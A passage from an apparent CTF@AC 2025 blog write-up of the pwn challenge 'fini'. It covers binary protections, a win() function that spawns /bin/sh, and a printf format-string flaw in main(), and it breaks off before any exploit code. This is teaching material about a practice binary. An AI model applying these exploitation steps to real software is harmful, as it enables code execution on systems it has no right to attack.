<!DOCTYPE html><html class="bg-background text-foreground scheme-light-dark" lang="en-US"> <head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes"><meta name="generator" content="Astro v5.8.0"><meta name="HandheldFriendly" content="True"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="format-detection" content="telephone=no,date=no,address=no,email=no,url=no"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: dark)"><meta name="theme-color" content="#121212" media="(prefers-color-scheme: light)"><link rel="sitemap" href="/sitemap-index.xml"><link rel="manifest" href="/site.webmanifest"><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/other-files/ClientRouter.astro_astro_type_script_index_0_lang.CtSceO8m.js"></script><title>CTF@AC 2025 – pwn/fini | z0v3r1n&#39;s blog</title><meta name="title" content="CTF@AC 2025 – pwn/fini | z0v3r1n's blog"><link rel="canonical" href="https://z0v3r1n.github.io"><meta property="og:title" content="CTF@AC 2025 – pwn/fini"><meta property="og:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta property="og:image:alt" content="CTF@AC 2025 – pwn/fini"><meta property="og:type" content="website"><meta property="og:locale" content="en-US"><meta property="og:site_name" content="z0v3r1n's blog"><meta property="og:url" content="https://z0v3r1n.github.io/blog/ctf-ac_fini/"><meta name="twitter:title" content="CTF@AC 2025 – pwn/fini"><meta property="twitter:image" content="https://z0v3r1n.github.io/static/1200x630.png"><meta name="twitter:image:alt" content="CTF@AC 2025 – pwn/fini"><meta name="twitter:card" content="summary_large_image"><meta property="article:tag" content="pwn"><meta property="article:tag" content="ctf-ac"><link rel="stylesheet" href="/other-files/about.DQPP2Tja.css"></head><body class="flex h-fit min-h-screen flex-col gap-y-6 font-sans"> <header class="bg-background/50 sticky top-0 z-50 divide-y backdrop-blur-sm xl:divide-none"> <div> <div class="mx-auto flex max-w-3xl items-center justify-between gap-4 px-4 py-3"> <a href="/" target="_self" class="transition-colors duration-300 ease-in-out flex shrink-0 items-center justify-center gap-3">  <span class="hidden h-full text-lg leading-none font-medium min-[400px]:block">z0v3r1n&#39;s blog</span>  </a> <div class="flex items-center gap-4"> <nav class="flex items-center gap-4 text-sm sm:gap-6"> <a href="/blog" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> blog/
 </a><a href="/about" target="_self" class="inline-block duration-300 ease-in-out text-foreground/60 hover:text-foreground transition-colors"> about/
 </a> </nav> <button data-slot="button" class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-muted hover:text-foreground dark:hover:bg-muted/50 -my-2 -me-2 size-8" id="theme-toggle" title="Toggle theme"> <svg width="1em" height="1em" class="size-4 dark:hidden" data-icon="lucide:sun">   <symbol id="ai:lucide:sun" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32l1.41 1.41M2 12h2m16 0h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></g></symbol><use href="#ai:lucide:sun"></use>  </svg> <svg width="1em" height="1em" class="absolute hidden size-4 dark:block" data-icon="lucide:moon">   <symbol id="ai:lucide:moon" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3a6 6 0 0 0 9 9a9 9 0 1 1-9-9"/></symbol><use href="#ai:lucide:moon"></use>  </svg> <span class="sr-only">Toggle theme</span> </button> <script data-astro-rerun>
  (() => {
    const theme = (() => {
      const stored = localStorage?.getItem('theme') ?? ''
      if (['dark', 'light'].includes(stored)) return stored
      return window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light'
    })()

    document.documentElement.setAttribute('data-theme', theme)
    window.localStorage.setItem('theme', theme)
  })()
</script> <script type="module">function a(){const e=document.documentElement,n=e.getAttribute("data-theme")==="dark"?"light":"dark";e.classList.add("[&_*]:transition-none"),e.setAttribute("data-theme",n),window.getComputedStyle(e).getPropertyValue("opacity"),requestAnimationFrame(()=>{e.classList.remove("[&_*]:transition-none")}),localStorage.setItem("theme",n)}function o(){document.getElementById("theme-toggle")?.addEventListener("click",a)}o();document.addEventListener("astro:after-swap",()=>{const e=localStorage.getItem("theme")||"light",t=document.documentElement;t.classList.add("[&_*]:transition-none"),window.getComputedStyle(t).getPropertyValue("opacity"),t.setAttribute("data-theme",e),requestAnimationFrame(()=>{t.classList.remove("[&_*]:transition-none")}),o()});</script> </div> </div> </div>   </header> <main class="w-full mx-auto flex grow flex-col gap-y-6 px-4">   <section class="grid grid-cols-[minmax(0px,1fr)_min(calc(var(--breakpoint-md)-2rem),100%)_minmax(0px,1fr)] gap-y-6">  <section class="col-start-2 flex flex-col gap-y-6 text-center"> <div class="flex flex-col"> <h1 class="mb-2 scroll-mt-31 text-3xl leading-tight font-medium sm:text-4xl" id="post-title"> CTF@AC 2025 – pwn/fini </h1> <div class="text-muted-foreground divide-border mb-4 flex flex-col items-center justify-center divide-y text-xs sm:flex-row sm:flex-wrap sm:divide-x sm:divide-y-0 sm:text-sm"> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span>September 13, 2025</span> </div> <div class="flex w-full items-center justify-center gap-2 py-2 sm:w-fit sm:px-2 sm:py-0 first:sm:pl-0 last:sm:pr-0"> <span> 3 min read  </span> </div>  </div> <div class="flex flex-wrap justify-center gap-2"> <a href="/tags/pwn" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" class="size-3" data-icon="lucide:hash">   <symbol id="ai:lucide:hash" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 9h16M4 15h16M10 3L8 21m8-18l-2 18"/></symbol><use href="#ai:lucide:hash"></use>  </svg> pwn </a><a href="/tags/ctf-ac" class="inline-flex items-center justify-center rounded-md border px-2 py-0.5 text-xs font-medium w-fit whitespace-nowrap shrink-0 [&#38;>svg]:size-3 gap-1 [&#38;>svg]:pointer-events-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive transition-[color,box-shadow] overflow-hidden border-transparent bg-muted text-foreground [a&#38;]:hover:bg-muted/90"> <svg width="1em" height="1em" viewBox="0 0 24 24" class="size-3" data-icon="lucide:hash">   <use href="#ai:lucide:hash"></use>  </svg> ctf-ac </a> </div> </div> <nav class="col-start-2 grid grid-cols-1 gap-4 sm:grid-cols-2"> <a href="/blog/fortid-ctf-2025_protect_the_env#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-start size-full" aria-disabled="false">  <svg width="1em" height="1em" class="mr-2 size-4 transition-transform group-hover:-translate-x-1" data-icon="lucide:arrow-left">   <symbol id="ai:lucide:arrow-left" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m12 19l-7-7l7-7m7 7H5"/></symbol><use href="#ai:lucide:arrow-left"></use>  </svg> <div class="flex flex-col items-start overflow-hidden text-wrap"> <span class="text-muted-foreground text-left text-xs"> Previous Post </span> <span class="w-full text-left text-sm text-balance text-ellipsis"> FortiD CTF 2025 – pwn/protect-the-environment </span> </div>  </a>  <a href="/blog/ctf-ac_babybof#post-title" target="_self" class="duration-300 ease-in-out gap-2 whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&#38;_svg]:pointer-events-none [&#38;_svg:not([class*='size-'])]:size-4 shrink-0 [&#38;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive border bg-background hover:bg-muted hover:text-foreground dark:bg-input/30 dark:border-input dark:hover:bg-input/50 px-4 py-2 has-[>svg]:px-3 rounded-lg group flex items-center justify-end size-full" aria-disabled="false">  <div class="flex flex-col items-end overflow-hidden text-wrap"> <span class="text-muted-foreground text-right text-xs"> Next Post </span> <span class="w-full text-right text-sm text-balance text-ellipsis"> CTF@AC 2025 – pwn/babybof </span> </div> <svg width="1em" height="1em" class="ml-2 size-4 transition-transform group-hover:translate-x-1" data-icon="lucide:arrow-right">   <symbol id="ai:lucide:arrow-right" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7-7l7 7l-7 7"/></symbol><use href="#ai:lucide:arrow-right"></use>  </svg>  </a> </nav> </section>  <article class="prose col-start-2 max-w-none"> <blockquote>
<p><em>Hope you can FINIsh this challenge.</em></p>
</blockquote>
<div class="expressive-code"><link rel="stylesheet" href="/other-files/ec.jdn72.css"/><script type="module" src="/other-files/ec.8zarh.js"></script><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:55ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">file</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./challenge</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">|</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">tr</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;,&#39;</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">&#39;\n&#39;</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">./challenge:</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">ELF</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">64-bit</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">LSB</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pie</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">executable</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">x86-64</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">version</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8"> (SYSV)</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">dynamically</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">linked</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">interpreter</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">/lib64/ld-linux-x86-64.so.2</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8"> </span></span><span style="--0:#24292E;--1:#E1E4E8">BuildID[sha1]</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#032F62;--1:#9ECBFF">4293e516c8a744cddc10088c31128d37fd365557</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> GNU/Linux </span><span style="--0:#005CC5;--1:#79B8FF">3.2.0</span></div></div><div class="ec-line" style="--ecIndent:1ch"><div class="code"><span class="indent"> </span><span style="--0:#6F42C1;--1:#B392F0">not</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">stripped</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">pwn</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">checksec</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#24292E;--1:#E1E4E8">[</span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#032F62;--1:#9ECBFF">&#39;/home/kali/Desktop/ctfs/others/fini/challenge&#39;</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Arch:</span><span style="--0:#24292E;--1:#E1E4E8">       </span><span style="--0:#032F62;--1:#9ECBFF">amd64-64-little</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">RELRO:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">No</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">RELRO</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stack:</span><span style="--0:#24292E;--1:#E1E4E8">      </span><span style="--0:#032F62;--1:#9ECBFF">No</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">canary</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">found</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">NX:</span><span style="--0:#24292E;--1:#E1E4E8">         </span><span style="--0:#032F62;--1:#9ECBFF">NX</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">PIE:</span><span style="--0:#24292E;--1:#E1E4E8">        </span><span style="--0:#032F62;--1:#9ECBFF">PIE</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">enabled</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="code"><span class="indent">    </span><span style="--0:#6F42C1;--1:#B392F0">Stripped:</span><span style="--0:#24292E;--1:#E1E4E8">   </span><span style="--0:#032F62;--1:#9ECBFF">No</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">FINIsh</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">this</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">challenge</span><span style="--0:#24292E;--1:#E1E4E8"> ;) ===</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">What</span><span style="--0:#6F42C1;--1:#B392F0">&#39;s your name?</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">z0v3r1n</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Hello, z0v3r1n</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">!</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">1) write</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">2) exit</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">&gt; 1</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Addr (hex): 1234</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">Value (hex, 8 bytes): abc</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">zsh: segmentation fault  ./challenge</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="$ file ./challenge | tr ',' '\n'./challenge: ELF 64-bit LSB pie executable x86-64 version 1 (SYSV) dynamically linked interpreter /lib64/ld-linux-x86-64.so.2 BuildID[sha1]=4293e516c8a744cddc10088c31128d37fd365557 for GNU/Linux 3.2.0 not stripped$ pwn checksec ./challenge[*] '/home/kali/Desktop/ctfs/others/fini/challenge'    Arch:       amd64-64-little    RELRO:      No RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        PIE enabled    Stripped:   No$ ./challenge=== FINIsh this challenge ;) ===What's your name?z0v3r1nHello, z0v3r1n!1) write2) exit> 1Addr (hex): 1234Value (hex, 8 bytes): abczsh: segmentation fault  ./challenge"><div></div></button></div></figure></div>
<p>Looking at the defined functions we find a <code>win()</code> function:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:70ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; info func</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">All defined functions:</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Non-debugging symbols:</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001000  _init</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001030  puts@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001040  system@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001050  printf@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001060  fgets@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001070  setvbuf@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001080  __isoc99_scanf@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001090  exit@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x00000000000010a0  __cxa_finalize@plt</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x00000000000010b0  main</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001290  _start</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x00000000000012c0  deregister_tm_clones</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x00000000000012f0  register_tm_clones</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001330  __do_global_dtors_aux</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001370  frame_dummy</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001380  win</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x000000000000138c  _fini</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; disas win</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">Dump of assembler code for function win:</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">   </span></span><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001380 &lt;+0&gt;:     lea    rdi,[rip+0xc7d]        # 0x2004</span></div></div><div class="ec-line" style="--ecIndent:3ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent"><span style="--0:#24292e;--1:#e1e4e8">   </span></span><span style="--0:#24292e;--1:#e1e4e8">0x0000000000001387 &lt;+7&gt;:     jmp    0x1040 &lt;system@plt&gt;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">End of assembler dump.</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">pwndbg&gt; x/s 0x2004</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">0x2004: &quot;/bin/sh&quot;</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="pwndbg> info funcAll defined functions:Non-debugging symbols:0x0000000000001000  _init0x0000000000001030  puts@plt0x0000000000001040  system@plt0x0000000000001050  printf@plt0x0000000000001060  fgets@plt0x0000000000001070  setvbuf@plt0x0000000000001080  __isoc99_scanf@plt0x0000000000001090  exit@plt0x00000000000010a0  __cxa_finalize@plt0x00000000000010b0  main0x0000000000001290  _start0x00000000000012c0  deregister_tm_clones0x00000000000012f0  register_tm_clones0x0000000000001330  __do_global_dtors_aux0x0000000000001370  frame_dummy0x0000000000001380  win0x000000000000138c  _finipwndbg> disas winDump of assembler code for function win:   0x0000000000001380 <+0>:     lea    rdi,[rip+0xc7d]        # 0x2004   0x0000000000001387 <+7>:     jmp    0x1040 <system@plt>End of assembler dump.pwndbg> x/s 0x20040x2004: &#34;/bin/sh&#34;"><div></div></button></div></figure></div>
<p>Looking at the implementation of the greeting in the <code>main()</code> function we can see that the program prints our name unsafely i.e. without any format specifiers giving rise to fmt-string vulnerability.</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:43ch"><code><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;=== FINIsh this challenge ;) ===&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">puts</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;What</span><span style="--0:#005CC5;--1:#79B8FF">\&#39;</span><span style="--0:#032F62;--1:#9ECBFF">s your name?&quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">fgets</span><span style="--0:#24292E;--1:#E1E4E8">((</span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#AE4B07;--1:#FFAB70">name</span><span style="--0:#24292E;--1:#E1E4E8">,</span><span style="--0:#BF3441;--1:#F97583">0x</span><span style="--0:#005CC5;--1:#79B8FF">80</span><span style="--0:#24292E;--1:#E1E4E8">,stdin);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">&quot;Hello, &quot;</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:2ch"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span class="indent">  </span><span style="--0:#6F42C1;--1:#B392F0">printf</span><span style="--0:#24292E;--1:#E1E4E8">((</span><span style="--0:#BF3441;--1:#F97583">char</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8">)</span><span style="--0:#AE4B07;--1:#FFAB70">name</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="  puts(&#34;=== FINIsh this challenge ;) ===&#34;);  puts(&#34;What\'s your name?&#34;);  fgets((char *)name,0x80,stdin);  printf(&#34;Hello, &#34;);  printf((char *)name);"><div></div></button></div></figure></div>
<p>We can confirm the fmt-string vulnerability by inputting a fmt-string:</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="shell" class="wrap" style="--ecMaxLine:32ch"><code><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">$</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">./challenge</span></div></div><div class="ec-line"><div class="code"><span style="--0:#032F62;--1:#9ECBFF">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">FINIsh</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">this</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">challenge</span><span style="--0:#24292E;--1:#E1E4E8"> ;) ===</span></div></div><div class="ec-line"><div class="code"><span style="--0:#6F42C1;--1:#B392F0">What</span><span style="--0:#6F42C1;--1:#B392F0">&#39;s your name?</span></div></div><div class="ec-line"><div class="code"><span 